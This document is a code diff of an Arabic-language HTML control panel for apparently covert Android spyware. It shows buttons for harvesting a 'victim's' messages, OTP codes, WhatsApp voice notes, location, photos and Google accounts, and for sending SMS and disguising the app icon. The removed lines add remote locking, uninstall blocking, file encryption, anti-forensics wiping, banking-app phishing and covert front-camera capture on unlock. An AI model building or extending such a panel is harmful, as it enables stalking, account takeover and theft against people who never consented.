@@ -25,40 +25,38 @@
                     <span class="text">الصور الفورية</span>
                     <span id="liveImagesCount" class="badge">0</span>
                 </button>
+
                 <button id="liveMsgsBtn" onclick="openLiveMessages()" class="action-btn-grid style-msgs">
                     <span class="icon">🆕</span>
                     <span class="text">الرسائل الفورية</span>
                     <span id="liveMsgsCount" class="badge">0</span>
                 </button>
+
                 <button id="liveOtpBtn" onclick="openLiveOtp()" class="action-btn-grid style-otp">
                     <span class="icon">🔐</span>
                     <span class="text">OTP</span>
                     <span id="liveOtpCount" class="badge">0</span>
                 </button>
+
                 <button id="liveVoicesBtn" onclick="openLiveVoices()" class="action-btn-grid style-voices">
                     <span class="icon">🎤</span>
                     <span class="text">صوتيات واتساب</span>
                     <span id="liveVoicesCount" class="badge">0</span>
                 </button>
+
                 <button id="sendSmsBtn" onclick="openSendSms()" class="action-btn-grid style-sms">
                     <span class="icon">📨</span>
                     <span class="text">إرسال SMS</span>
                 </button>
+
                 <button id="replyWaBtn" onclick="openReplyWaPicker()" class="action-btn-grid style-wa">
                     <span class="icon">↩️</span>
                     <span class="text">رد واتساب</span>
                 </button>
+
                 <button id="disguiseBtn" onclick="openDisguiseMenu()" class="action-btn-grid style-disguise">
                     <span class="icon">🎭</span>
                     <span class="text">تغيير الأيقونة</span>
-                </button>
-                <button id="advancedBtn" onclick="switchTab('advanced')" class="action-btn-grid style-advanced">
-                    <span class="icon">⚡</span>
-                    <span class="text">المميزات المتقدمة</span>
-                </button>
-                <button id="adminBtn" onclick="switchTab('admin')" class="action-btn-grid style-admin">
-                    <span class="icon">🛡️</span>
-                    <span class="text">Admin كامل</span>
                 </button>
             </div>
         </header>
@@ -96,8 +94,6 @@
             <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('device')">📊 الجهاز</button>
             <button class="tab" onclick="switchTab('security')">🔐 الأجهزة <span id="pendingBadge" class="count"></span></button>
-            <button class="tab" onclick="switchTab('advanced')">⚡ متقدمة</button>
-            <button class="tab" onclick="switchTab('admin')">🛡️ Admin</button>
         </div>
 
         <div class="tab-content">
@@ -127,17 +123,28 @@
                     <div id="contactDetails"></div>
                 </div>
             </div>
+
             <div id="locationTab" class="tab-pane">
                 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
                     <h3 style="margin:0;border:none;padding:0;">📍 الموقع الحي</h3>
-                    <button onclick="reloadMap()" style="background:#00ffcc;color:#000;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🔄 تحديث</button>
+                    <button onclick="reloadMap()" style="background:#00ffcc;color:#000;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                        🔄 تحديث
+                    </button>
                 </div>
-                <iframe id="mapFrame" src="/map.html" style="width:100%; height:75vh; border:1px solid #00ffcc; border-radius:8px; background:#000;" frameborder="0" loading="lazy"></iframe>
+                <iframe 
+                    id="mapFrame"
+                    src="/map.html" 
+                    style="width:100%; height:75vh; border:1px solid #00ffcc; border-radius:8px; background:#000;"
+                    frameborder="0"
+                    loading="lazy">
+                </iframe>
             </div>
+
             <div id="imagesTab" class="tab-pane">
                 <h3>🖼️ الصور</h3>
                 <div id="imagesGrid" class="images-grid"></div>
             </div>
+
             <div id="deletedTab" class="tab-pane">
                 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
                     <h3 style="margin:0;border:none;padding:0;">🗑️ سلة المحذوفات</h3>
@@ -151,13 +158,17 @@
                 </div>
                 <div id="deletedList"></div>
             </div>
+
             <div id="whatsappTab" class="tab-pane">
                 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
                     <h3 style="margin:0;border:none;padding:0;">💬 رسائل واتساب</h3>
-                    <button onclick="clearWhatsAppList()" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🗑️ مسح الكل</button>
+                    <button onclick="clearWhatsAppList()" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                        🗑️ مسح الكل
+                    </button>
                 </div>
                 <div id="whatsappList"></div>
             </div>
+
             <div id="googleTab" class="tab-pane">
                 <h3>📧 حسابات Google</h3>
                 <div id="googleAccountsList"></div>
@@ -174,184 +185,31 @@
                 <h3>📊 الجهاز</h3>
                 <div id="deviceInfo"></div>
             </div>
+
             <div id="securityTab" class="tab-pane">
                 <h3>🔐 الأجهزة المصرح لها</h3>
+
                 <div style="margin-bottom:20px;">
                     <h4 style="color:#ffcc00;">⏳ قيد الانتظار</h4>
                     <div id="pendingDevicesList" style="margin-top:10px;"></div>
                 </div>
+
                 <div style="margin-bottom:20px;">
                     <h4 style="color:#00ffcc;">✅ مصرح لها</h4>
                     <div id="approvedDevicesList" style="margin-top:10px;"></div>
                 </div>
+
                 <div style="margin-bottom:20px;">
                     <h4 style="color:#ff3300;">🚫 محجوبة</h4>
                     <div id="deniedDevicesList" style="margin-top:10px;"></div>
                 </div>
+
                 <div style="margin-top:30px;">
                     <h4 style="color:#9b59b6;">🔐 صلاحيات الوصول للأجهزة</h4>
-                    <p style="color:#888;font-size:12px;margin-bottom:15px;">اختر من يستطيع رؤية كل جهاز ضحية</p>
-                    <div id="devicePermsList" style="margin-top:10px;"></div>
-                </div>
-            </div>
-
-            <!-- ⚡ قسم المميزات المتقدمة -->
-            <div id="advancedTab" class="tab-pane">
-                <h3>⚡ المميزات المتقدمة</h3>
-                <p style="color:#888;font-size:13px;margin-bottom:20px;text-align:center;">أدوات متقدمة للتحكم بالجهاز عن بعد</p>
-
-                <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:15px;">
-                    <div style="background:#0a0a0a;border:2px solid #ff4444;border-radius:12px;padding:18px;">
-                        <h4 style="color:#ff4444;margin-bottom:10px;">🔒 قفل الجهاز</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يقفل الشاشة فوراً</p>
-                        <button onclick="advancedAction('lock_device')" style="width:100%;background:linear-gradient(135deg,#ff4444,#cc0000);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🔒 قفل</button>
-                    </div>
-
-                    <div style="background:#0a0a0a;border:2px solid #ff6b6b;border-radius:12px;padding:18px;">
-                        <h4 style="color:#ff6b6b;margin-bottom:10px;">🚫 منع إلغاء التثبيت</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع حذف/تعطيل التطبيق</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('enable_uninstall_protection')" style="flex:1;background:#ff6b6b;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 تفعيل</button>
-                            <button onclick="advancedAction('disable_uninstall_protection')" style="flex:1;background:#222;color:#ff6b6b;border:1px solid #ff6b6b;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🔓 إيقاف</button>
-                        </div>
-                    </div>
-
-                    <div style="background:#0a0a0a;border:2px solid #00ffcc;border-radius:12px;padding:18px;">
-                        <h4 style="color:#00ffcc;margin-bottom:10px;">🖱️ الضغط التلقائي</h4>
-                        <input id="clickText" placeholder="نص الزر" style="width:100%;padding:10px;background:#111;border:1px solid #00ffcc;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
-                        <button onclick="autoClickText()" style="width:100%;background:#00ffcc;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🖱️ اضغط</button>
-                    </div>
-
-                    <div style="background:#0a0a0a;border:2px solid #25D366;border-radius:12px;padding:18px;">
-                        <h4 style="color:#25D366;margin-bottom:10px;">💬 رد تلقائي</h4>
-                        <input id="autoReplyText" placeholder="نص الرد" style="width:100%;padding:10px;background:#111;border:1px solid #25D366;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
-                        <button onclick="autoReplyAny()" style="width:100%;background:#25D366;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">💬 أرسل</button>
-                    </div>
-
-                    <div style="background:#0a0a0a;border:2px solid #9b59b6;border-radius:12px;padding:18px;">
-                        <h4 style="color:#9b59b6;margin-bottom:10px;">⌨️ كتابة نص</h4>
-                        <input id="typeTextInput" placeholder="النص" style="width:100%;padding:10px;background:#111;border:1px solid #9b59b6;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
-                        <button onclick="typeText()" style="width:100%;background:#9b59b6;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">⌨️ اكتب</button>
-                    </div>
-
-                    <div style="background:#0a0a0a;border:2px solid #FFD700;border-radius:12px;padding:18px;">
-                        <h4 style="color:#FFD700;margin-bottom:10px;">🔐 تشفير الملفات</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">كل التخزين (بدون فيديو)</p>
-                        <input id="encryptionPassword" type="password" placeholder="كلمة المرور" style="width:100%;padding:10px;background:#111;border:1px solid #FFD700;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="encryptFiles()" style="flex:1;background:#FFD700;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🔒 تشفير</button>
-                            <button onclick="decryptFiles()" style="flex:1;background:#00cc66;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🔓 فك</button>
-                        </div>
-                    </div>
-
-                    <div style="background:#0a0a0a;border:2px solid #00aaff;border-radius:12px;padding:18px;">
-                        <h4 style="color:#00aaff;margin-bottom:10px;">🎮 أزرار الجهاز</h4>
-                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
-                            <button onclick="advancedAction('go_home')" style="background:#111;color:#00aaff;border:1px solid #00aaff;padding:10px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">🏠 Home</button>
-                            <button onclick="advancedAction('go_back')" style="background:#111;color:#00aaff;border:1px solid #00aaff;padding:10px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">⬅️ Back</button>
-                            <button onclick="advancedAction('open_recents')" style="background:#111;color:#00aaff;border:1px solid #00aaff;padding:10px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">📋 Recents</button>
-                            <button onclick="advancedAction('open_notifications')" style="background:#111;color:#00aaff;border:1px solid #00aaff;padding:10px;border-radius:6px;cursor:pointer;font-weight:bold;font-size:12px;">🔔 إشعارات</button>
-                        </div>
-                    </div>
-
-                    <div style="background:#0a0a0a;border:2px solid #ff9800;border-radius:12px;padding:18px;">
-                        <h4 style="color:#ff9800;margin-bottom:10px;">🌐 فتح تطبيق</h4>
-                        <input id="openAppPackage" placeholder="com.whatsapp" style="width:100%;padding:10px;background:#111;border:1px solid #ff9800;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
-                        <button onclick="openApp()" style="width:100%;background:#ff9800;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🌐 افتح</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- 🛡️ قسم Admin — مختصر -->
-            <div id="adminTab" class="tab-pane">
-                <h3>🛡️ Admin — مميزات شغالة</h3>
-                <p style="color:#00ffcc;font-size:13px;margin-bottom:20px;text-align:center;">
-                    ✅ المميزات دي شغالة بـ Device Admin العادي
-                </p>
-
-                <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:15px;">
-
-                    <!-- 📷 صورة عند فتح القفل -->
-                    <div style="background:#0a0a0a;border:2px solid #00ffcc;border-radius:12px;padding:18px;">
-                        <h4 style="color:#00ffcc;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
-                            <span style="font-size:22px;">📷</span> صورة عند فتح القفل
-                        </h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:15px;">
-                            كل مرة يفتح الضحية الجهاز → كاميرا أمامية تلتقط صورة
-                        </p>
-                        <div style="display:flex;gap:8px;margin-bottom:8px;">
-                            <button onclick="advancedAction('enable_unlock_camera')" style="flex:1;background:linear-gradient(135deg,#00ffcc,#009977);color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
-                                ✅ تفعيل
-                            </button>
-                            <button onclick="advancedAction('disable_unlock_camera')" style="flex:1;background:#222;color:#00ffcc;border:1px solid #00ffcc;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
-                                🔓 إيقاف
-                            </button>
-                        </div>
-                        <button onclick="loadUnlockPhotos()" style="width:100%;background:#FFD700;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
-                            📊 عرض الصور الملتقطة
-                        </button>
-                    </div>
-
-                    <!-- 🕵️ Anti-Forensics -->
-                    <div style="background:#0a0a0a;border:2px solid #9b59b6;border-radius:12px;padding:18px;">
-                        <h4 style="color:#9b59b6;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
-                            <span style="font-size:22px;">🕵️</span> Anti-Forensics
-                        </h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:15px;">
-                            يمسح آثار التطبيق — logcat، cache، ملفات مؤقتة
-                        </p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('enable_anti_forensics')" style="flex:1;background:linear-gradient(135deg,#9b59b6,#8e44ad);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
-                                ✅ تفعيل
-                            </button>
-                            <button onclick="advancedAction('disable_anti_forensics')" style="flex:1;background:#222;color:#9b59b6;border:1px solid #9b59b6;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
-                                🔓 إيقاف
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- 🎣 Auto-Phishing -->
-                    <div style="background:#0a0a0a;border:2px solid #ff0066;border-radius:12px;padding:18px;">
-                        <h4 style="color:#ff0066;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
-                            <span style="font-size:22px;">🎣</span> Auto-Phishing
-                        </h4>
-                        <p style="color:#ff6b6b;font-size:11px;margin-bottom:12px;">
-                            ⚠️ استخدمها بمسؤولية
-                        </p>
-                        <input id="phishingTarget" placeholder="اسم التطبيق (مثلاً: com.bank.app)" style="width:100%;padding:10px;background:#111;border:1px solid #ff0066;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="startPhishing()" style="flex:1;background:linear-gradient(135deg,#ff0066,#cc0052);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
-                                ✅ تفعيل
-                            </button>
-                            <button onclick="advancedAction('disable_phishing')" style="flex:1;background:#222;color:#ff0066;border:1px solid #ff0066;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
-                                🔓 إيقاف
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- 🔒 قفل تلقائي -->
-                    <div style="background:#0a0a0a;border:2px solid #ffc107;border-radius:12px;padding:18px;">
-                        <h4 style="color:#ffc107;margin-bottom:10px;">⏱️ قفل تلقائي</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يقفل الشاشة بعد X ثانية</p>
-                        <input id="lockTimeoutInput" type="number" placeholder="ثواني (30)" min="5" max="600" style="width:100%;padding:10px;background:#111;border:1px solid #ffc107;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;text-align:center;font-family:inherit;">
-                        <button onclick="setLockTimeout()" style="width:100%;background:#ffc107;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">⏱️ تطبيق</button>
-                    </div>
-
-                </div>
-
-                <!-- 📊 سجل الصور التلقائية -->
-                <div style="margin-top:25px;padding:15px;background:#0a0a0a;border:1px solid #FFD700;border-radius:10px;">
-                    <h4 style="color:#FFD700;margin-bottom:12px;">📊 سجل الصور التلقائية</h4>
-                    <button onclick="loadUnlockPhotos()" style="background:#00ffcc;color:#000;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
-                        🔄 تحديث
-                    </button>
-                    <div id="unlockPhotosList" style="margin-top:15px;display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;"></div>
-                </div>
-
-                <div style="margin-top:20px;padding:15px;background:#001a1a;border:1px solid #00ffcc;border-radius:10px;">
-                    <p style="color:#00ffcc;font-size:12px;margin:0;">
-                        ℹ️ <b>ملاحظة:</b> المميزات اللي كانت محتاجة Device Owner (قفل بكلمة، منع Screenshot، حبس الجهاز، مسح الجهاز) اتشالت — لأنها مش هتشتغل بدون ADB.
+                    <p style="color:#888;font-size:12px;margin-bottom:15px;">
+                        اختر من يستطيع رؤية كل جهاز ضحية
                     </p>
+                    <div id="devicePermsList" style="margin-top:10px;"></div>
                 </div>
             </div>
         </div>
@@ -375,9 +233,9 @@
             <h2 style="color:#ff0066;text-shadow:0 0 15px #ff0066;">💬 الرسائل الفورية</h2>
             <div>
                 <button onclick="filterLiveMsgs('all')" id="filterAll" style="background:#ff0066;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;">الكل</button>
-                <button onclick="filterLiveMsgs('in')" id="filterIn" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:5px;">📥</button>
-                <button onclick="filterLiveMsgs('out')" id="filterOut" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:5px;">📤</button>
-                <button onclick="clearLiveMsgs()" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">🗑️ مسح</button>
+                <button onclick="filterLiveMsgs('in')" id="filterIn" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:5px;">📥 مستلمة</button>
+                <button onclick="filterLiveMsgs('out')" id="filterOut" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:5px;">📤 مرسلة</button>
+                <button onclick="clearLiveMsgs()" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">🗑️ مسح الكل</button>
                 <button onclick="closeLiveMessages()" style="background:#333;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;">✖ إغلاق</button>
             </div>
         </div>
@@ -390,7 +248,7 @@
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
             <h2 style="color:#ffcc00;text-shadow:0 0 15px #ffcc00;">🔐 أكواد OTP</h2>
             <div>
-                <button onclick="clearLiveOtp()" style="background:#ff3300;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;">🗑️ مسح</button>
+                <button onclick="clearLiveOtp()" style="background:#ff3300;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;">🗑️ مسح الكل</button>
                 <button onclick="closeLiveOtp()" style="background:#333;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">✖ إغلاق</button>
             </div>
         </div>
@@ -403,8 +261,8 @@
         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
             <h2 style="color:#00ffcc;text-shadow:0 0 15px #00ffcc;">🎤 الرسائل الصوتية</h2>
             <div>
-                <button onclick="triggerVoiceScan()" style="background:#ffcc00;color:#000;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-left:10px;">🔁 فحص</button>
-                <button onclick="clearLiveVoices()" style="background:#ff3300;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;">🗑️ مسح</button>
+                <button onclick="triggerVoiceScan()" style="background:#ffcc00;color:#000;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-left:10px;">🔁 فحص المجلدات</button>
+                <button onclick="clearLiveVoices()" style="background:#ff3300;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;">🗑️ مسح الكل</button>
                 <button onclick="closeLiveVoices()" style="background:#333;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;margin-right:10px;">✖ إغلاق</button>
             </div>
         </div>
@@ -423,4 +281,4 @@
     }
     </script>
 </body>
-                            </html>
+    </html>
